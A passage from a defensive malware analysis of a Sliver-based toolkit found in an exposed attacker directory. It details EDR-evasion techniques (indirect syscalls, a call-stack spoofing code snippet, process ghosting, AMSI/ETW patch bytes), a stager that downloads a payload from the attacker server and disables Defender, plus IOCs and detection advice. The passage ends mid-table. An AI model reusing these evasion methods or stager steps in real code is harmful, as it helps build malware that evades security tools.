The runtime syscall resolution walks the PEB → LDR module list to locate `ntdll.dll` without calling `LoadLibrary` (no EDR visibility into this lookup). The `SC_Address()` function implements HalosGate neighbor-search: if the target NT function's opcodes are hooked (EDR has injected a `JMP`), it scans adjacent NT functions for an unhooked `syscall;ret` gadget and uses that address instead. This is the indirect syscall capability — the EDR's hook is never called, but the System Service Number (SSN) resolution survives function patching.

Hash seed: `SW3_SEED = 0x9DEA8D94` (ROR8-based rolling hash). Max syscall table entries: 600.

**Why This Matters:** Every process injection operation — allocating memory in sihost.exe, writing shellcode, changing memory permissions, creating a thread — bypasses EDR usermode hooks entirely. EDRs that rely solely on ntdll hook-based telemetry are blind to these six operations. Detection requires either: (a) kernel-level ETW callbacks (`Microsoft-Windows-Threat-Intelligence` provider, ETWti), (b) hardware-based monitoring (Intel PT), or (c) memory scanning for the SysWhispers3 data structures.

**Detection approach:**

- The sorted syscall number lookup table (`SW3_SYSCALL_LIST`, up to 600 entries) is a distinctive in-memory artifact
- YARA hunting for `\x94\x8D\xEA\x9D` (hash seed `0x9DEA8D94`, little-endian) near a sorted array structure identifies SysWhispers3 across polymorphic builds
- EDRs with kernel-level ETW callbacks retain visibility — cannot be bypassed from usermode
- CrowdStrike Falcon, Palo Alto Cortex XDR, and SentinelOne implement kernel-mode syscall interception that detects call stacks with "ghost frames" (return addresses not pointing to known API entry points)

---

#### Technique 2: Call Stack Spoofing

**File:** `stack_spoof.C`
**Composite Score: 7/10**
**MITRE ATT&CK:** T1055 (Process Injection — behavioral evasion subset)
**Confidence:** DEFINITE (source confirmed)

**How it works:**

```c
PVOID legitFunctions[] = {
    GetProcAddress(hKernel32, "BaseThreadInitThunk"),
    GetProcAddress(hNtdll, "RtlUserThreadStart"),
    GetProcAddress(hKernel32, "Sleep"),
};
PVOID legitReturn = legitFunctions[rand() % 3];
PVOID* returnAddress = (PVOID*)_AddressOfReturnAddress();
*returnAddress = legitReturn;  // overwrite return address
((void(*)())targetFunction)();
*returnAddress = originalReturn;  // restore
```

Temporarily overwrites the caller's own return address on the stack with a randomly selected legitimate Windows function address before calling a target function. EDRs inspecting the call stack at the moment of the call see `BaseThreadInitThunk`, `RtlUserThreadStart`, or `Sleep` as the return site — not the malicious shellcode.

**Why This Matters:** Randomization across three return addresses (rather than a deterministic single address) is a deliberate counter-measure against EDRs that fingerprint specific fake stack frames. Detection requires: (a) memory-level call stack inspection that traces through the spoofed frames, (b) detecting `_AddressOfReturnAddress()` usage (an unusual self-modifying stack pattern), or (c) correlating that a function "called from Sleep" lacks the expected calling context for Sleep.

**Implementation scope:** This implementation spoofs only the immediate return address (terminal frame) — not a full multi-frame call stack. More sophisticated implementations (Unwinder-based techniques) fabricate entire multi-frame stacks with plausible intermediate frames. EDRs that perform deep stack unwinding beyond the first frame can see through this single-frame spoof; this is a capable but not state-of-the-art implementation, consistent with the broader cybercrime-tier capability assessment.

**Detection approach:**

- Elastic Security Labs documents "ghost frame" detection via stack unwind analysis
- A function call appearing to originate from `Sleep` without the expected preceding Sleep call context is a high-confidence anomaly
- IBM X-Force documents behavioral detection of this pattern via reflective call stack analysis

---

#### Technique 3: String Obfuscation (XOR 0x42)

**File:** `string_obf.C`
**Composite Score: 4/10**
**Confidence:** DEFINITE

XOR key `0x42` applied byte-by-byte. Stack-allocated decode buffer (`_alloca`) — no heap artifacts. Defeats static string scanners and YARA rules targeting plaintext IOC strings (C2 domains, API names, the sihost.exe injection target). Trivially reversible by any analyst using FLOSS or manual XOR. The `_alloca` choice is the only technically notable element — deliberate forensic-evasion: heap-based memory forensics will not recover decoded strings.

---

#### Technique 4: VM and Sandbox Detection

**File:** `vm_checks.C`
**Composite Score: 5/10**
**Confidence:** DEFINITE

Two checks: CPU core count `< 2` → exit; system uptime `< 600,000 ms` (10 minutes) → exit. `GetTickCount` is dynamically resolved (absent from import table). The embedded Sliver canary `intezer.com` provides a third DNS-based check targeting the Intezer analysis platform specifically.

Modern sandboxes with environment simulation (ANY.RUN, Joe Sandbox, Cuckoo with uptime patches) defeat the CPU and uptime checks. The canary domain check is more sophisticated — it demonstrates awareness of a specific analysis platform and serves as a real-time sandbox/analyst detection mechanism. Any analyst VM resolving `intezer.com` through a corporate proxy may unintentionally trigger the abort condition.

---

#### Technique 5: Argument Spoofing (PEB Overwrite)

**File:** `arg_spoof.C`
**Composite Score: 4/10**
**Confidence:** DEFINITE

Hardcoded fake argument: `L"MicrosoftEdgeUpdate.exe --update-check --silent"`. Writes directly to PEB via GS segment register at offset 0x60. Every binary from this pipeline presents the same fake identity — a fixed string detectable once observed.

Effective against process-tree-based behavioral rules that alert on PowerShell spawning unexpected executables. Detectable by comparing the claimed process path (`MicrosoftEdgeUpdate.exe`) against the actual on-disk binary path (`%TEMP%\update.exe`) — a path mismatch is a high-confidence indicator.

---

#### Technique 6: Heaven's Gate (32→64 Mode Switching)

> **Plain language:** Modern Windows is exclusively 64-bit, but many security tools monitor a specific translation layer used when 32-bit programs run on 64-bit systems. Heaven's Gate exploits this layer to switch execution modes in a way that some security tools do not monitor, allowing the malware to make low-level system calls that are invisible to certain detection products.

**Files:** `heavens_gate.asm` (451 bytes source), `heavens_gate.bin` (34 bytes binary)
**Composite Score: 6/10**
**Confidence:** DEFINITE (source and compiled binary confirmed)

Position-independent NASM assembly using far return (`retf`) to transition from 32-bit (WOW64, CS=0x23) to 64-bit mode (CS=0x33), execute 64-bit code, and return to 32-bit (CS=0x23 via `retfq`). Uses `call`/`add` pattern for position-independent address calculation — no hardcoded addresses.

This toolkit contains **two** Heaven's Gate implementations: the standalone 34-byte stub (`heavens_gate.bin`) and a WOW64 path in `syscalls.C`. The standalone binary is a direct-injection artifact — suitable for injection into 32-bit target processes independently. This dual implementation suggests the attacker anticipated needing to target 32-bit processes in addition to the standard 64-bit sihost.exe.

Detection: Modern EDRs hook both 32-bit and 64-bit ntdll layers in WOW64 processes. Windows Control Flow Guard (CFG) on Windows 10/11 restricts jumps to native 64-bit code from 32-bit space. Historical malware using this technique: FinFisher, TrickBot, Qakbot.

---

#### Technique 7: Process Ghosting

> **Plain language:** Process Ghosting creates a program that runs in memory but has no corresponding file on disk that can be found and scanned. It works by writing the malicious code to a file marked for deletion, loading it into memory before the deletion completes, then letting the file disappear — leaving a running process with no on-disk evidence.

**File:** `process_ghosting.c`
**Composite Score: 7/10**
**MITRE ATT&CK:** T1055.015, T1070
**Confidence:** MODERATE (70%) — source fully implemented; dynamic execution not confirmed (C2 offline)

Five-step sequence:

1. Create temp file `%TEMP%\update.tmp` with `FILE_FLAG_DELETE_ON_CLOSE`
2. Write PE image to temp file
3. Mark for deletion via `SetFileInformationByHandle(FileDispositionInfo)`
4. `NtCreateSection(SEC_IMAGE)` while file is delete-pending
5. `NtCreateProcessEx` from section → process runs with no corresponding file on disk

The running process has no on-disk image — file-hash-based scanning fails entirely. EDR products that cross-reference process image paths see empty or ghost paths.

**Critical implementation gap:** This implementation calls `NtCreateSection` and `NtCreateProcessEx` via `GetProcAddress` — not through the SysWhispers3 direct syscall layer. This means EDR hooks on these specific NT functions would fire, potentially detecting the ghosting sequence. This is an architectural inconsistency in the attacker's evasion stack.

**Detection:** The five-step sequence (Create → Write → DeletePending → Section → Process) is the detection signature. Microsoft Defender for Endpoint was updated to detect `NtCreateSection` on delete-pending files. SentinelOne uses behavioral AI to flag processes with no backing file on disk. Windows 11 24H2 included targeted mitigations.

---

### 4.2 ScareCrow-Delegated Techniques (Stub Architecture)

These five modules contain empty function bodies that return `TRUE`. ScareCrow implements them natively during the loader wrapping phase. The stubs are a deliberate architectural choice, not incomplete work.

---

#### Technique 8: Module Stomping

**File:** `module_stomp.C` (stub)
**MITRE ATT&CK:** T1055.008
**Confidence:** MODERATE (65%) — capability present in build configuration; active mode was process hollowing (mode 0x04), not stomping (mode 0x0a)

ScareCrow loads a legitimate DLL (`clrjit.dll`, `wldp.dll`, or `xpsservices.dll` per ScareCrow defaults) and overwrites its memory with shellcode. The shellcode appears to execute from a trusted, signed DLL's address range, defeating memory-region-based detection rules that flag RWX anonymous memory. Detection: memory-to-disk comparison — in-memory DLL content that differs from the on-disk version is a high-fidelity indicator.

---

#### Technique 9: PPID Spoofing

**File:** `ppid_spoof.C` (stub)
**MITRE ATT&CK:** T1134.004
**Confidence:** DEFINITE — hollow target invisible in all three analysis sessions

ScareCrow uses `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` at `CreateProcess` time. The process appears as a child of a legitimate Windows process, breaking behavioral rules that flag PowerShell spawning executables. Detection requires kernel-level ETW visibility capturing the true calling process context — most consumer-grade EDRs without kernel callbacks can be deceived.

---

#### Technique 10: ETW Patching

> **Plain language:** Windows includes two built-in security reporting systems — ETW (Event Tracing for Windows) and AMSI (Antimalware Scan Interface) — that many security products rely on to receive alerts about suspicious activity. This technique silences both by modifying them in memory at startup, causing them to stop reporting anything from the malicious process.

**File:** `etw_amsi_patch.c` — `PatchETW()` (stub)
**MITRE ATT&CK:** T1562.006 (Indicator Blocking)
**Confidence:** HIGH — ScareCrow-native capability confirmed by source documentation

ScareCrow patches `EtwEventWrite` in the injected process's ntdll with `ret 0`. All ETW events from the injected process are silently discarded.

**Critical nuance for defenders:** User-mode ETW patching affects only user-mode ETW providers. **Kernel-mode ETW providers (`Microsoft-Windows-Threat-Intelligence`, ETWti) continue to function regardless.** Detection: a process (sihost.exe post-injection) that is active with network behavior but producing zero ETW telemetry is flagged as "ETW silent" — a high-confidence anomaly. Elastic Security monitors for `VirtualProtect` calls on `ntdll.dll`. ETWti `Event ID 7 (THREATINT_PROTECTVM_LOCAL)` fires when a process makes its own code section writable.

---

#### Technique 11: AMSI Patching

**File:** `etw_amsi_patch.c` — `PatchAMSI()` (stub)
**MITRE ATT&CK:** T1562.001
**Confidence:** HIGH — ScareCrow-native; byte-level verification of `AmsiScanBuffer` prologue not completed before C2 went offline

ScareCrow patches `AmsiScanBuffer` prologue with `XOR RAX,RAX; RET` (bytes `48 31 C0 C3`). All AMSI scans in the injected process return "clean" without scanning. Note: the stager also bypasses AMSI via the `amsiInitFailed` reflection technique (Stage 1). Two distinct AMSI bypasses are active at different stages.

**Detection:** The `XOR RAX,RAX; RET` pattern (`48 31 C0 C3`) on `AmsiScanBuffer` is highly signatured. Microsoft Defender scans its own `amsi.dll` in memory for modifications. Carbon Black uses behavioral rules to detect the `VirtualProtect → WriteProcessMemory` pattern on security DLLs. This specific patch is "effectively dead in highly-monitored environments" per security researchers — its presence here is consistent with the cybercrime/less-sophisticated-operator hypothesis.

---

#### Technique 12: Sleep Masking

> **Plain language:** When the implant is idle between check-ins, it encrypts its own code in memory. Security tools scanning the computer's memory during this dormant period find only scrambled, unreadable data rather than recognizable malware code — making memory-based detection significantly harder.

**File:** `sleep.mask.C` (stub)
**Confidence:** HIGH (85%) — ScareCrow-native; sleep masking confirmed active by process analysis

During the effective 90–510 second dormancy window (300-second base, 70% jitter), ScareCrow encrypts the beacon's in-memory shellcode region. Memory scanners running during dormancy find no readable executable content in anonymous memory regions.

**Detection:** The beacon transitions between readable and non-readable memory states on a regular interval — detectable by periodic memory scanning. Tools like beacon hunting tools (open-source beacon hunting tools: Hunt-Sleeping-Beacons and BeaconHunter) identify threads in `WaitReason = DelayExecution` with suspicious call stacks. The effective dormancy range (90–510 seconds with 70% jitter) means memory scanning at under 90-second intervals would catch the beacon in its active state.

---

### 4.3 ScareCrow-Native Techniques

#### Technique 13: Entropy Normalization

Referenced in build.log Phase 3. ScareCrow randomizes the binary's entropy profile to avoid detection rules that flag high-entropy sections (a signature of encryption or packing). This defeats entropy-based detection heuristics without affecting functional behavior.

#### Technique 14: Timestamp Manipulation

Referenced in build.log Phase 3. ScareCrow modifies PE timestamps to appear as a legitimate build rather than a fresh compilation. The actual build timestamp (2026-02-14 15:01:23, from build.log) may differ from the PE header timestamp embedded in the binary.

#### Technique 15: Fraudulent Code Signing

Serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`. Self-signed RSA-2048 impersonating `VMware, Inc.`. Applied during build Phase 2. Passes superficial trust checks on endpoints with permissive signing policies. Fails on endpoints with full chain-of-trust validation — the certificate is not chained to any CA in the Microsoft Trusted Root Store.

The `CA:TRUE` flag set on a code-signing certificate is a reliable detection indicator — legitimate code-signing certificates never carry this extension. It is an artifact of the scripted `openssl req -x509` command used to generate the certificate.

---

### Evasion Stack Summary


| Layer Targeted             | Techniques Applied                                                                                                                      | Defense Defeated                                                        |
| -------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
| Static file scanning       | String obfuscation (XOR 0x42), entropy normalization, polymorphic 2,558-chunk encoding, timestamp manipulation, fraudulent code signing | AV signature, YARA string rules, entropy detection, file age heuristics |
| Sandbox detonation         | VM checks (CPU < 2, uptime < 10 min), canary domain (intezer.com)                                                                       | Automated sandbox pipelines                                             |
| EDR API hook monitoring    | SysWhispers3 direct/indirect syscalls (6 NT functions)                                                                                  | EDR ntdll usermode hook telemetry                                       |
| Process tree analysis      | PPID spoofing                                                                                                                           | Behavioral rules on parent-child relationships                          |
| Command line inspection    | Argument spoofing (PEB overwrite)                                                                                                       | Process argument monitoring                                             |
| Memory region scanning     | Module stomping, sleep masking, process hollowing into signed process                                                                   | Memory-based YARA, RWX region detection                                 |
| Call stack inspection      | Call stack spoofing (3 randomized return addresses)                                                                                     | EDR call chain behavioral rules                                         |
| Process image verification | Process ghosting                                                                                                                        | File-hash-based process validation                                      |
| ETW telemetry              | ETW patching (ScareCrow — affects usermode ETW only)                                                                                    | ETW-consuming security tools (usermode only; kernel ETWti unaffected)   |
| AMSI content scanning      | AMSI patching (stager + ScareCrow loader)                                                                                               | AMSI-integrated AV/EDR for script content                               |


<figure style="text-align: center; margin: 2em 0;">
  <img src="{{ "/assets/images/sliver-open-directory/unrolled-shellcode-assembly-chain.png" | relative_url }}" alt="Disassembler view of the unrolled shellcode assembly chain showing the sequential per-chunk decryption call structure of the ScareCrow loader">
  <figcaption><em>Figure 9: The unrolled assembly chain inside the ScareCrow loader — the 2,558 sequential call instructions visible here are the hallmark of ScareCrow's polymorphic chunked encryption. Each call represents one ~451-byte encrypted shellcode segment being decoded in sequence.</em></figcaption>
</figure>

**Evasion stack realism assessment:** The 15-technique stack is sophisticated but not impenetrable. Enterprise EDRs with kernel-level callbacks (ETWti, PsSetCreateProcessNotifyRoutine, hardware-assisted monitoring) retain visibility through most of these layers. The primary detection gap exists for EDRs relying exclusively on usermode ntdll hook telemetry — these products are effectively blind to the SysWhispers3-mediated process injection operations and will not observe ETW telemetry from the injected process.

---

## 5. Infrastructure and Build Pipeline

### 5.1 Hosting Provider: 1337 Services GmbH (AS210558)

**Confidence:** HIGH (90%) for bulletproof classification; DEFINITE for ASN identification.


| Attribute           | Value                                                                    |
| ------------------- | ------------------------------------------------------------------------ |
| ASN                 | AS210558                                                                 |
| Registered name     | SERVICES-1337-GMBH                                                       |
| Registered address  | Ludwig-Erhard-Str. 18, 20459 Hamburg, Germany                            |
| Infrastructure      | Germany and Netherlands (primary); Poland, US, Canada (upstream peering) |
| IP prefix count     | 23 IPv4 prefixes, 3 IPv6 prefixes                                        |
| Domain count on ASN | ~2,152 domains across 889 IP addresses                                   |


**Bulletproof hosting confirmation:** 1337 Services GmbH explicitly advertises "bulletproof VPS" services at x1337.cc, including "unmetered bandwidth, all ports open, included SMTP ports" and "unmetered IP spoofing enabled dedicated servers." Scamalytics rates the ASN as medium-to-high fraud risk with over 37% of traffic flagged as fraudulent or suspicious. Abuse.ch (ThreatFox) labels infrastructure from this ASN as under cybercriminal control, with near-zero response rate to standard AbuseIPDB and DMCA abuse reports.

**Law enforcement connection:** Krebs on Security (February 2025) linked the co-founders of 1337 Services GmbH — Florian Marzahl ("FloraiN", former Cracked.to administrator) and Finn Grimpe ("Finndev", linked to Nulled.to) — to **StarkRDP** and **rdp.sh** services seized during **DOJ Operation Talent**, which targeted the Cracked.to and Nulled.to cybercrime forums. These forums traffic in stolen credentials, malware, and hacking tools. Domain names were seized; no criminal charges were filed specifically against the 1337 Services GmbH principals at time of reporting.

**Network-level mitigation:** Threat intelligence feeds flag AS210558 as presumptively malicious infrastructure. All IPs in the 45.94.31.0/24 range should be treated accordingly.

**Sources:** IPinfo.io AS210558 record (Tier 1); PeeringDB AS210558 (Tier 1); Krebs on Security "Who's Behind the Seized Forums 'Cracked' & 'Nulled'?" (Feb 2025, Tier 3 corroborated by DOJ records); x1337.cc (provider's own marketing); Scamalytics assessment.

---

### 5.2 Build Server: 45.94.31.220

**Roles confirmed on this single IP:**

- **Build server** — automated pipeline executed here (from build.log)
- **Payload delivery server** — `hxxp[:]//45.94.31[.]220:8000/` served the entire workspace
- **C2 listener** — Sliver teamserver (ports 443, 8443); MODERATE confidence (70%) — actual C2 may be on separate infrastructure if `mailuxe.net` resolves elsewhere

This single-server architecture is a significant OPSEC failure. All forensic evidence concentrates at one point. A single network block disrupts build, delivery, and C2 simultaneously.

**Services observed:**


| Port | Service                                        | Evidence                                                         |
| ---- | ---------------------------------------------- | ---------------------------------------------------------------- |
| 8000 | HTTP file server (Python http.server inferred) | stager.ps1 URL; open directory listing                           |
| 8080 | Open directory indexer/scanner                 | opendirectory.png (indexer already tagged files before analysis) |
| 443  | Sliver C2 listener (HTTPS/mTLS)                | build.log, Sliver-command.txt                                    |
| 8443 | Sliver C2 fallback                             | Sliver-command.txt                                               |


---

### 5.3 C2 Domains

**mailuxe.net** — Primary and fallback C2 (ports 443, 8443). No prior malicious history found in threat intelligence feeds at time of research (2026-02-28). Two competing hypotheses: (H1, more likely) newly registered/squatted domain — the domain co-locates on 45.94.31.220 alongside the bulletproof VPS build server, inconsistent with a legitimate business web presence; (H2) compromised legitimate domain. Passive DNS verification required to resolve. HIGH confidence of attacker control based on co-location and explicit build log reference.

**mailmassange.duckdns.org** — Backup C2 (port 443). Free, anonymous DuckDNS dynamic DNS subdomain — no registration required. DuckDNS is among the most abused dynamic DNS services in malware campaigns, with documented use by APT28, APT29, Gamaredon, Scattered Spider, and multiple cybercrime operators. The backup domain provides C2 resilience: if `mailuxe.net` is sinkholed, the DuckDNS subdomain provides a fallback with a different infrastructure fingerprint. DuckDNS cooperates with law enforcement and maintains registration logs. The subdomain name `mailmassange` appears human-selected (low entropy) rather than algorithmically generated — consistent with a single operator.

---

### 5.4 Open Directory Exposure

> **Plain language:** The attacker's entire working environment — equivalent to leaving an unlocked office with all tools, blueprints, and materials visible — was accidentally made publicly accessible on the internet. This is an unusually significant intelligence windfall: most malware analysis works only from the finished product; this analysis had access to the manufacturing process itself.

**What was exposed:** 270 files across 69 subdirectories, totaling 144 MB. This includes:

- Full ScareCrow, Donut, and SysWhispers3 source repositories (as cloned from GitHub)
- 13 custom source modules (C/ASM/text)
- 3 compiled beacons (OneDriveSync.exe, Excel.exe, compressed.exe)
- 1 raw shellcode blob (encoded.bin, 19 MB)
- 3 certificate files including unencrypted private key
- Build log (build.log) — the attacker's operational record
- Sliver C2 generation command (Sliver-command.txt) — complete C2 configuration

**Exposure timeline:**

- `2026-02-14 15:01:23` — Build pipeline starts
- `2026-02-14 15:08:34+` — `OneDriveSync.exe` available at port 8000
- `2026-02-14 21:45` — Open directory indexed by third-party scanner at port 8080
- `~6.75 hours` — Elapsed time between build completion and discovery

**Intelligence value vs. typical open directory exposures:** Most documented cases yield compiled binaries. This exposure yielded source code (13 files), operational records, and an unencrypted private signing key — enabling implementation-level analysis unavailable from binary analysis alone. The pre-deployment timing means defensive action was possible before confirmed victim compromise.

---

## 6. Threat Actor Assessment

### UTA-2026-001 Designation

> **Note on UTA identifiers:** "UTA" stands for Unattributed Threat Actor. UTA-2026-001 is an internal tracking designation assigned by The Hunters Ledger to actors observed across analysis who cannot yet be linked to a publicly named threat group. This label will not appear in external threat intelligence feeds or vendor reports — it is specific to this publication. If future evidence links this activity to a known named actor, the designation will be retired and updated accordingly.

**Threat Actor:** Unknown — designated **UTA-2026-001**
**Confidence (distinct actor):** MODERATE (68%)
**Attribution:** INSUFFICIENT for named attribution — no infrastructure overlap with known named campaigns found in research.

```
Threat Actor: Unknown (UTA-2026-001)
Confidence: INSUFFICIENT for named attribution
  - Why this confidence: No infrastructure overlap with known named campaigns.
    mailuxe.net shows no prior malicious history. 1337 Services GmbH hosts
    thousands of domains. Build pipeline fingerprint (ScareCrow+Donut+SysWhispers3)
    is consistent with multiple independent operators using public tools.
  - What's missing: Passive DNS data for mailuxe.net; second sample with C1/C2
    characteristic overlap; victim reports; prior sighting of certificate serial
    659EEB5AA4A489FB238993AF259D23F057F6D6D6.
  - What would increase confidence: Infrastructure overlap with a named Tier 1/2
    reported campaign; same certificate serial in a previously attributed sample;
    victim reports identifying sector or targeting patterns.
```

### UTA Gate Assessment

**Gate 1 — Minimum 3 distinctive characteristics (at least 2 technical/infrastructure):** PASSES


| Characteristic                                | Type                     | Evidence                     | Distinctiveness                                                                                                                                                                                                               |
| --------------------------------------------- | ------------------------ | ---------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **C1: Build pipeline fingerprint**            | TECHNICAL                | build.log + source composite | Go 1.24.2 + ScareCrow + Donut + SysWhispers3 with automated build script; UUID-named workspace (`/var/tmp/.cache-1f6a38a2-1771081283`); specific stub/implemented evasion module split not visible from binary analysis alone |
| **C2: Fraudulent certificate infrastructure** | INFRASTRUCTURE/TECHNICAL | cert.pem + key.pem           | Serial `659EEB5AA4A489FB238993AF259D23F057F6D6D6`; VMware/Redmond geographic mismatch; unencrypted private key left on serving infrastructure; CA:TRUE flag; collectively distinctive and trackable                           |
| **C3: Dual-beacon parallel delivery**         | CONTEXTUAL               | Directory listing; build.log | OneDriveSync.exe (background sync lure) + Excel.exe (user-lure) from same build pipeline; DuckDNS backup alongside registered domain; 2027 killswitch                                                                         |


**Gate 2 — B2 Admiralty threshold:** PASSES — Source reliability B (first-hand analysis of recovered attacker artifacts); Claim credibility 2 (evidence consistent across build.log, source code, dynamic analysis, certificate, directory listing). Combined: B2. Both gates pass.

### Threat Category: Cybercrime (HIGH — 80%)

The toolchain characteristics, infrastructure choices, and operational behaviors are most consistent with a cybercrime operation — likely an access broker or post-access monetization model:


| Indicator                          | Assessment                                                                                                             |
| ---------------------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| Sliver C2 (open-source)            | Commodity C2 widely used by cybercrime operators; consistent with post-Operation Morpheus migration from Cobalt Strike |
| 1337 Services GmbH / AS210558      | Standard bulletproof hosting choice for cybercrime infrastructure                                                      |
| DuckDNS backup domain              | Free, anonymous — cybercrime OPSEC tier, not APT infrastructure                                                        |
| 2027 killswitch                    | Planned multi-year campaign consistent with ransomware affiliate or access broker                                      |
| stager.ps1 skill gap               | Basic delivery against sophisticated payload — consistent with access broker supplying stages to a toolkit builder     |
| No targeting indicators            | No victim sector, geography, or specific target evidence in artifacts                                                  |
| No espionage-specific capabilities | No credential dumping, data staging, or lateral movement tools in recovered non-Sliver artifacts                       |


**Competing hypotheses:**


| Hypothesis                                       | Likelihood     |
| ------------------------------------------------ | -------------- |
| H1: Cybercrime (access broker / initial access)  | HIGH (80%)     |
| H2: Financially motivated sophisticated criminal | MODERATE (15%) |
| H3: State-sponsored / APT using commodity tools  | LOW (5%)       |


**Threat Level: MEDIUM** — C2 offline; no confirmed victims; OPSEC failures suggest operator may not have deployed successfully; single-server architecture is a significant fragility. If the infrastructure was re-established after exposure, the same toolkit is operational with new IOCs. The 2027 killswitch indicates planned long-term use; re-deployment probability is HIGH.

**Post-Operation Morpheus Context (Stage 2 research finding):** Operation Morpheus (June 2024) disrupted 593 malicious Cobalt Strike servers across 27 countries, directly accelerating threat actor migration to Sliver and other open-source C2 frameworks. The use of Sliver here is consistent with the post-Morpheus landscape where sophisticated cybercrime operators have consciously reduced Cobalt Strike exposure.

---

## 7. MITRE ATT&CK Mapping


| Tactic               | Technique ID | Technique Name                               | Confidence     | Key Evidence                                                                                                                        |
| -------------------- | ------------ | -------------------------------------------- | -------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| Resource Development | T1587.002    | Code Signing Certificates                    | DEFINITE       | build.log Phase 2; cert.pem + key.pem recovered                                                                                     |
| Resource Development | T1588.002    | Obtain Capabilities: Tool                    | DEFINITE       | ScareCrow/, donut/, SysWhispers3/ repos on server; build.log Phase 1 git clone                                                      |
| Initial Access       | T1204.002    | User Execution: Malicious File               | MODERATE (65%) | Excel.exe lure filename implies user click; stager requires user or prior execution                                                 |
| Execution            | T1059.001    | PowerShell                                   | DEFINITE       | stager.ps1 source recovered; AMSI bypass + download + exec confirmed                                                                |
| Execution            | T1106        | Native API                                   | DEFINITE       | SysWhispers3 assembly stubs issue syscall instructions directly; confirmed disassembler                                             |
| Defense Evasion      | T1055.012    | Process Injection: Process Hollowing         | DEFINITE       | XZ mode byte 0x04; disassembly compare chain; hollowing handler dispatch confirmed; 3 sessions                                      |
| Defense Evasion      | T1055.015    | Process Injection: Process Ghosting          | MODERATE (70%) | process_ghosting.c fully implemented; dynamic execution not confirmed (C2 offline)                                                  |
| Defense Evasion      | T1055.008    | Process Injection: Module Stomping           | MODERATE (65%) | build.log declares capability; ScareCrow implements natively; active mode was hollowing                                             |
| Defense Evasion      | T1134.004    | Parent PID Spoofing                          | DEFINITE       | Hollow target invisible in behavioral sandbox; absent from memory forensics tool pstree; 3 sessions confirm                                               |
| Defense Evasion      | T1036.005    | Masquerading: Match Legitimate Name/Location | DEFINITE       | Beacon as update.exe; signed as VMware, Inc. Code Signing                                                                           |
| Defense Evasion      | T1036        | Masquerading (PEB CommandLine)               | HIGH           | arg_spoof.C: PEB CommandLine overwritten to MicrosoftEdgeUpdate.exe identity                                                        |
| Defense Evasion      | T1027.002    | Software Packing                             | DEFINITE       | UPX 5.0.2 (compressed.exe); ScareCrow 2,558-chunk polymorphic encoding (OneDriveSync.exe)                                           |
| Defense Evasion      | T1027.008    | Stripped Payloads                            | DEFINITE       | --skip-symbols in Sliver-command.txt; -trimpath=true in build flags                                                                 |
| Defense Evasion      | T1027.013    | Encrypted/Encoded File                       | DEFINITE       | AES-128-CTR Donut instance encryption; XOR 0x42 string encoding                                                                     |
| Defense Evasion      | T1140        | Deobfuscate/Decode Files or Information      | DEFINITE       | Runtime XOR decoding (stack-allocated); Donut AES bootstrap at RIP base+0x59 confirmed                                              |
| Defense Evasion      | T1497.001    | System Checks                                | DEFINITE       | vm_checks.C: dwNumberOfProcessors < 2 → exit; GetTickCount() < 600000 → exit                                                        |
| Defense Evasion      | T1497.003    | Time-Based Evasion                           | DEFINITE       | GetTickCount uptime check; 70% jitter on 300s base callback (effective 90–510s window)                                              |
| Defense Evasion      | T1553.002    | Code Signing                                 | DEFINITE       | cert.pem serial 659EEB5AA4A489FB238993AF259D23F057F6D6D6; self-signed; applied to binaries                                          |
| Defense Evasion      | T1562.001    | Disable or Modify Tools                      | DEFINITE       | stager: amsiInitFailed reflection; Set-MpPreference disable; ScareCrow: ETW + AMSI patches                                          |
| Defense Evasion      | T1620        | Reflective Code Loading                      | DEFINITE       | 18.4 MB PRV region; Donut RIP at base+0x59; Sliver PE never written to disk                                                         |
| Defense Evasion      | T1070        | Indicator Removal                            | MODERATE (65%) | process_ghosting.c FILE_FLAG_DELETE_ON_CLOSE; temp file deleted before process visible                                              |
| Discovery            | T1082        | System Information Discovery                 | DEFINITE       | vm_checks.C GetSystemInfo() for dwNumberOfProcessors                                                                                |
| Discovery            | T1057        | Process Discovery                            | MODERATE (60%) | ppid_spoof.C includes tlhelp32.h; PPID spoofing requires process enumeration                                                        |
| Command and Control  | T1071.001    | Web Protocols                                | HIGH           | Sliver --http mailuxe.net:443, --http mailmassange.duckdns.org:443, --http mailuxe.net:8443                                         |
| Command and Control  | T1573.002    | Asymmetric Cryptography                      | HIGH           | Sliver mTLS (mutual TLS) for C2 channel; confirmed by --http flag and Sliver default                                                |
| Command and Control  | T1105        | Ingress Tool Transfer                        | DEFINITE       | stager DownloadFile from [hxxp[:]//45.94.31[.]220:8000/OneDriveSync[.]exe](hxxp://45.94.31[.]220:8000/OneDriveSync[.]exe) → %TEMP%\update.exe |


**Note on persistence:** T1547.001 (Registry Run Keys) was assessed and NOT observed. Behavioral sandbox: zero registry writes by PID 3488 in 305-second run. Memory forensics tool: no persistence keys. Persistence is operator-deployed post-C2 establishment, not loader-automated.

---

## 8. Detection Opportunities

Detection is organized by kill chain stage. Because the build pipeline can regenerate polymorphically distinct beacons in approximately 8 minutes, behavioral and structural detection anchors are prioritized over file-hash-based blocking.

**Full detection rules (YARA, Sigma, Suricata, EDR queries, SIEM queries) are in the separate detection file:**
`hunting-detections/sliver-open-directory-detections.md`

**Full machine-readable IOCs (33 indicators across file hashes, network, certificates, host, behavioral) are in:**
`ioc-feeds/sliver-open-directory-iocs.json`

### Detection by Kill Chain Stage

#### Stager Stage (stager.ps1)

**Highest-value behavioral detection — the stager has no evasion specific to telemetry:**

- **Three-event chain** (high fidelity): `powershell.exe` → outbound TCP to non-standard port 8000 → creating `update.exe` in `%TEMP%`. Three-event chain uniquely identifies stager activity. (Sysmon EID 3, EID 11)
- **Script Block Logging (EID 4104)** captures the full stager content — the string `amsiInitFailed` is a unique indicator and trivially detected in PowerShell logging.
- **Windows Defender EID 5001** fires if the stager successfully disables real-time protection (requires admin execution).
- Monitor for `Set-MpPreference -DisableRealtimeMonitoring` in PowerShell logging — a reliable behavioral indicator regardless of who calls it.

**Post-Execution Forensic Artifacts (if stager has already run):** For incident responders engaging after the stager has executed, the following artifacts are the primary evidence trail — particularly valuable when the beacon has been deleted or overwritten:

| Artifact | Location | Significance |
| --- | --- | --- |
